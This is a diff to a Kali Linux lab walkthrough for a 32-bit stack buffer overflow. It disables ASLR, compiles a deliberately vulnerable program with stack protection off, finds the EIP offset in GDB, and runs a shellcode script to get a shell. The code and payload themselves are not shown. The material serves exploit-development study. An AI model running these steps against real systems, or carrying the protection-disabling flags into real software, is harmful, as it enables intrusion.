@@ -1,6 +1,6 @@
 //Step. 1 UPDATE
-
-If you have a problem with these instructions and apt failing because of keys. 
+Sudo apt update
+If you have a problem with update and apt failing because of keys. 
 
 sudo wget https://archive.kali.org/archive-key.asc -O /etc/apt/trusted.gpg.d/kali-archive-keyring.asc
 
@@ -8,16 +8,17 @@ If you have a missing public key replace F6BC with the key you need:
 
 sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys F6BC
 
+Sudo apt update
+
 //Step 2. Install GCC libraries 
 sudo apt install gcc-multilib
 
-//Step 3. Disable ASLR
+//Step 2.1. Disable ASLR
 sudo sysctl -w kernel.randomize_va_space=0
 
 
-//Step 3. Make the vulnnerable application
-
-//Step3.1 Enter this command in command prompt to create a C script:
+//Step 3. Making the vulnerable application
+//Step 3.1 Enter this command in command prompt to create a C script:
 nano winner.c
 
 //Step 3.2 Copy+Paste the following code into the window:
@@ -35,7 +36,7 @@ int main (int argc, char** argv){
 }
 ---
 
-//Step 3.3 Compile the bad code into a vulnerable application by using the command:
+//Step 3.3 Compile the code into a vulnerable application by using the command:
 gcc -m32 -fno-stack-protector -z exec -no-pie -g -Wno-implicit-function-declaration winner.c -o winner
 
 //Step 4. Run the vulnerable application with GDB debugger by entering the command:
@@ -44,7 +45,7 @@ gdb./winner
 //Step 5. Observe Assembly Dump of vulnerable application's 'Main' in GDB by using the command:
 disass main
 
-//Step 5.1 Keep note of the memory location of the 'strcpy' line. For me it was: 0x080491a1.
+//Step 5.1 Keep note of the memory location of the line just after the 'strcpy' line. For me it was: 0x080491a1.
 
 //Step 5.2 Place a breakpoint at this location in GDB by using the commmand:
 b 0x080491a1
@@ -58,7 +59,7 @@ run $(msf-pattern_create -l 500)
 
 //Step 6.1 Check the EIP with the command:
 info registers
-/for me the eip was -0x6c41376c
+/for me the eip was 0x6c41376c
 
 //Step 7 Finding the offset
 /open a new terminal
@@ -114,9 +115,3 @@ nano pieshell.py
 run $(python2.7 ./pieshell.py)
 
 /look out for the $ symbol which indicates the dash shell command line
-
-
-
-
-
-
